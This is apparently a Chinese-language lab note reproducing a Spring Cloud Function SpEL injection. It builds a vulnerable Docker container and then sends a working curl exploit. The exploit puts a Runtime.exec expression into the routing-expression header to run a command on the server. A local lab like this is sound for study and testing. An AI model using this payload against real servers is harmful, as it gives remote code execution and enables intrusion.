环境搭建
```
docker build -t spring-cloud-function-spel-injection .
docker run -d -p 9090:8080 spring-cloud-function-spel-injection
```

![](./img/559527d1537c4e4f852206229df8189f.png)


漏洞复现
```
curl -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/pwned\")" -X POST http://127.0.0.1:9090/functionRouter -d "justfortest"
```

![](./img/4bd9b892323a4fdc9b92df76eead27e5.png)
